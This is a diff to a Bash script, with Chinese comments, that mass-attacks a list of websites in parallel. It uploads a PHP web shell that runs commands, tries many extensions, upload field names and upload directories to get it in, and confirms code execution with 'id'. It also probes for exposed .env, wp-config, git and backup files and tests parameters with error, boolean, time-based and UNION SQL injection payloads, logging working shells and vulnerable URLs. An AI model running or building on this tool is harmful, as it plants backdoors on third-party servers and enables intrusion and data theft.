@@ -32,7 +32,7 @@ echo "━━━━━━━━━━━━━━━━━━━━━━━━�
 # 1. 文件上传（最高优先级，优化：20路径×8扩展名）
 # ==========================================
 echo ""
-echo "[1/8] 🚀 文件上传（20路径×8扩展名，并发20，五重验证）..."
+echo "[1/8] 🚀 文件上传（20路径×8扩展名×10参数名，并发20，三重验证）..."
 export OUT
 cat $OUT/targets.txt | xargs -P 20 -I {} bash -c '
     url="{}"
@@ -46,46 +46,67 @@ cat $OUT/targets.txt | xargs -P 20 -I {} bash -c '
         for ext in php PhP pHP phtml php5 php7 phar php3; do
             echo "<?php echo \"U${flag}\";@system(\$_GET[0]); ?>" > /tmp/u_$$_${ext}
             
-            # 上传（超时5秒）
-            resp=$(curl -skL -m 5 "$url$path" -F "file=@/tmp/u_$$_${ext}" -F "upload=@/tmp/u_$$_${ext}" \
-                -H "User-Agent: Mozilla/5.0" 2>/dev/null)
-            
-            # 提取shell URL（支持完整URL、相对路径、JSON格式）
-            shell=""
-            # 方式1: 完整URL
-            shell=$(echo "$resp" | grep -oE "https?://[a-zA-Z0-9._-]+/[a-zA-Z0-9._/-]+\.${ext}" | head -1)
-            # 方式2: 相对路径（需要拼接）
-            if [ -z "$shell" ]; then
-                rel_path=$(echo "$resp" | grep -oE "[a-zA-Z0-9._/-]+\.${ext}" | grep -vE "^http" | head -1)
-                if [ -n "$rel_path" ]; then
-                    shell="${url}${rel_path}"
-                fi
-            fi
-            # 方式3: JSON格式 {"url":"path"} 或 {"file":"path"}
-            if [ -z "$shell" ]; then
-                json_path=$(echo "$resp" | grep -oE '"(url|file|path|location)":"[^"]*\.'${ext}'"' | grep -oE '[^"]*\.'${ext} | head -1)
-                if [ -n "$json_path" ]; then
-                    if echo "$json_path" | grep -qE "^https?://"; then
-                        shell="$json_path"
-                    else
-                        shell="${url}${json_path#/}"
+            # 多种上传参数名组合测试
+            for param_combo in "file" "upload" "upload_file" "attachment" "image" "photo" "fileupload" "uploadfile" "file_upload" "uploaded_file"; do
+                # 上传（超时5秒）
+                resp=$(curl -skL -m 5 "$url$path" -F "${param_combo}=@/tmp/u_$$_${ext}" \
+                    -H "User-Agent: Mozilla/5.0" 2>/dev/null)
+                
+                # 提取shell URL（多种方式）
+                shell=""
+                # 方式1: 完整URL
+                shell=$(echo "$resp" | grep -oE "https?://[a-zA-Z0-9._-]+/[a-zA-Z0-9._/-]+\.${ext}" | head -1)
+                # 方式2: 相对路径
+                if [ -z "$shell" ]; then
+                    rel_path=$(echo "$resp" | grep -oE "[a-zA-Z0-9._/-]+\.${ext}" | grep -vE "^http|^/" | head -1)
+                    if [ -n "$rel_path" ]; then
+                        shell="${url}/${rel_path#/}"
                     fi
                 fi
-            fi
-            
-            # 验证1: URL格式正确
-            if [ -n "$shell" ] && echo "$shell" | grep -qE "^https?://" && echo "$shell" | grep -q "\.${ext}$"; then
-                # 验证2: 访问shell，检查flag
-                v1=$(curl -skL -m 4 "$shell" 2>/dev/null)
-                if echo "$v1" | grep -q "U${flag}"; then
-                    # 验证3: 命令执行测试
-                    v2=$(curl -skL -m 4 "$shell?0=echo+test123" 2>/dev/null)
-                    if echo "$v2" | grep -q "test123"; then
-                        # 验证4: 系统命令测试
-                        v3=$(curl -skL -m 4 "$shell?0=id" 2>/dev/null)
-                        if echo "$v3" | grep -qE "uid=|gid="; then
-                            # 验证5: 确保不是错误页面
-                            if ! echo "$v3" | grep -qiE "error|404|not found|forbidden"; then
+                # 方式3: JSON格式
+                if [ -z "$shell" ]; then
+                    json_path=$(echo "$resp" | grep -oE '"(url|file|path|location|data|src)":"[^"]*\.'${ext}'"' | sed 's/.*":"\([^"]*\)".*/\1/' | head -1)
+                    if [ -n "$json_path" ]; then
+                        if echo "$json_path" | grep -qE "^https?://"; then
+                            shell="$json_path"
+                        else
+                            shell="${url}/${json_path#/}"
+                        fi
+                    fi
+                fi
+                # 方式4: HTML中的路径
+                if [ -z "$shell" ]; then
+                    html_path=$(echo "$resp" | grep -oE "(href|src|action)=[\"'][^\"']*\.${ext}[\"']" | grep -oE "[^\"']*\.${ext}" | head -1)
+                    if [ -n "$html_path" ]; then
+                        if echo "$html_path" | grep -qE "^https?://"; then
+                            shell="$html_path"
+                        else
+                            shell="${url}/${html_path#/}"
+                        fi
+                    fi
+                fi
+                # 方式5: 尝试常见上传目录
+                if [ -z "$shell" ]; then
+                    for upload_dir in uploads upload files images photos media attachments; do
+                        test_shell="${url}/${upload_dir}/$(basename /tmp/u_$$_${ext})"
+                        test_resp=$(curl -skL -m 3 "$test_shell" 2>/dev/null)
+                        if echo "$test_resp" | grep -q "U${flag}"; then
+                            shell="$test_shell"
+                            break
+                        fi
+                    done
+                fi
+                
+                # 验证shell（放宽条件：只要flag匹配+命令执行即可）
+                if [ -n "$shell" ] && echo "$shell" | grep -qE "^https?://" && echo "$shell" | grep -q "\.${ext}$"; then
+                    # 验证1: 访问shell，检查flag
+                    v1=$(curl -skL -m 4 "$shell" 2>/dev/null)
+                    if echo "$v1" | grep -q "U${flag}"; then
+                        # 验证2: 命令执行测试
+                        v2=$(curl -skL -m 4 "$shell?0=echo+test123" 2>/dev/null)
+                        if echo "$v2" | grep -q "test123"; then
+                            # 验证3: 确保不是错误页面
+                            if ! echo "$v2" | grep -qiE "error|404|not found|forbidden|access denied"; then
                                 echo "$shell" >> "$OUT/shells/01_upload.txt"
                                 rm -f /tmp/u_$$_${ext}
                                 exit 0
@@ -93,7 +114,7 @@ cat $OUT/targets.txt | xargs -P 20 -I {} bash -c '
                         fi
                     fi
                 fi
-            fi
+            done
             rm -f /tmp/u_$$_${ext}
         done
     done
@@ -155,7 +176,7 @@ CONFIG=$(wc -l < $OUT/shells/02_config.txt 2>/dev/null || echo 0)
 WPCONFIG=$(wc -l < $OUT/shells/02_wpconfig.txt 2>/dev/null || echo 0)
 GIT=$(wc -l < $OUT/shells/02_git.txt 2>/dev/null || echo 0)
 FILES=$((ENV + CONFIG + WPCONFIG + GIT))
-echo "  ✅ 敏感文件: $FILES (.env:$ENV config:$CONFIG wp-config:$WPCONFIG git:$GIT)"
+echo "  ✅ 敏感文件: $FILES"
 
 # ==========================================
 # 3. 未授权API（数据验证）
@@ -305,7 +326,7 @@ cat $OUT/targets.txt | xargs -P 20 -I {} bash -c '
         for ext in sql zip tar tar.gz bak old; do
             resp=$(curl -skL -m 5 "$url/${name}.${ext}" -I 2>/dev/null)
             if echo "$resp" | grep -qE "^HTTP.*200" && \
-               echo "$resp" | grep -qiE "Content-Type:.*(application|text|sql|zip|tar)"; then
+               echo "$resp" | grep -qiE "Content-Type:.*application|Content-Type:.*text|Content-Type:.*sql|Content-Type:.*zip|Content-Type:.*tar"; then
                 # 验证：下载部分内容检查
                 content=$(curl -skL -m 5 "$url/${name}.${ext}" 2>/dev/null | head -c 500)
                 if [ $(echo "$content" | wc -c) -gt 100 ]; then
@@ -530,36 +551,40 @@ cat $OUT/targets.txt | xargs -P 15 -I {} bash -c '
     if echo "$url" | grep -q "?"; then
         base_url=$(echo "$url" | cut -d? -f1)
         query_string=$(echo "$url" | cut -d? -f2)
+        params=$(echo "$query_string" | grep -oE "[a-zA-Z0-9_]+" | sort -u)
     else
         base_url="$url"
-        query_string=""
+        params=""
     fi
     
-    # 提取参数名
-    params=$(echo "$query_string" | grep -oE "[a-zA-Z0-9_]+=" | tr -d "=" | sort -u)
+    # 常见参数名列表（主动测试）
+    common_params="id page user uid pid cat category search q query keyword key name value data"
     
-    if [ -n "$params" ]; then
-        for param in $params; do
-            # 报错注入检测（最快，先检测）
-            error_resp=$(curl -skL -m 4 "${base_url}?${param}=1'"'"'" 2>/dev/null)
+    # 合并已有参数和常见参数
+    all_params=$(echo "$params $common_params" | tr " " "\n" | sort -u)
+    
+    if [ -n "$all_params" ]; then
+        for param in $all_params; do
+            # 报错注入检测（单引号）
+            error_resp=$(curl -skL -m 4 "${base_url}?${param}=1'\''" 2>/dev/null)
             if echo "$error_resp" | grep -qiE "mysql|postgresql|sqlite|mssql|oracle|syntax error|sql error|database error|warning.*mysql|you have an error"; then
-                echo "${base_url}?${param}=1'"'"'" >> "$OUT"/shells/13_sqli_error.txt
+                echo "${base_url}?${param}=1'\''" >> "$OUT/shells/13_sqli_error.txt"
                 break
             fi
             
             # 布尔盲注检测
-            true_resp=$(curl -skL -m 4 "${base_url}?${param}=1'"'"' AND '"'"'1'"'"'='"'"'1" 2>/dev/null)
-            false_resp=$(curl -skL -m 4 "${base_url}?${param}=1'"'"' AND '"'"'1'"'"'='"'"'2" 2>/dev/null)
+            true_resp=$(curl -skL -m 4 "${base_url}?${param}=1'\'' AND '\''1'\''='\''1" 2>/dev/null)
+            false_resp=$(curl -skL -m 4 "${base_url}?${param}=1'\'' AND '\''1'\''='\''2" 2>/dev/null)
             
             if [ "$true_resp" != "$false_resp" ] && [ -n "$true_resp" ] && [ -n "$false_resp" ] && \
                [ $(echo "$true_resp" | wc -c) -gt 100 ] && [ $(echo "$false_resp" | wc -c) -gt 100 ]; then
-                # 时间盲注验证（确认布尔盲注后）
+                # 时间盲注验证
                 start=$(date +%s)
-                curl -skL -m 8 "${base_url}?${param}=1'"'"' AND SLEEP(5)--" >/dev/null 2>&1
+                curl -skL -m 8 "${base_url}?${param}=1'\'' AND SLEEP(5)--" >/dev/null 2>&1
                 end=$(date +%s)
                 
                 if [ $((end - start)) -ge 4 ]; then
-                    echo "${base_url}?${param}=1'"'"' AND SLEEP(5)--" >> "$OUT"/shells/13_sqli_time.txt
+                    echo "${base_url}?${param}=1'\'' AND SLEEP(5)--" >> "$OUT/shells/13_sqli_time.txt"
                     break
                 fi
             fi
@@ -569,14 +594,14 @@ cat $OUT/targets.txt | xargs -P 15 -I {} bash -c '
             if echo "$union_resp" | grep -qE "[^0-9]2[^0-9]" && \
                ! echo "$union_resp" | grep -qiE "error|syntax|mysql error|sql error" && \
                [ $(echo "$union_resp" | wc -c) -gt 100 ]; then
-                echo "${base_url}?${param}=1 UNION SELECT 1,2,3--" >> "$OUT"/shells/13_sqli_union.txt
+                echo "${base_url}?${param}=1 UNION SELECT 1,2,3--" >> "$OUT/shells/13_sqli_union.txt"
                 break
             fi
             
             # 双引号注入检测
             dq_error=$(curl -skL -m 4 "${base_url}?${param}=1\"" 2>/dev/null)
             if echo "$dq_error" | grep -qiE "mysql|postgresql|sqlite|syntax error|sql error"; then
-                echo "${base_url}?${param}=1\"" >> "$OUT"/shells/13_sqli_error.txt
+                echo "${base_url}?${param}=1\"" >> "$OUT/shells/13_sqli_error.txt"
                 break
             fi
         done
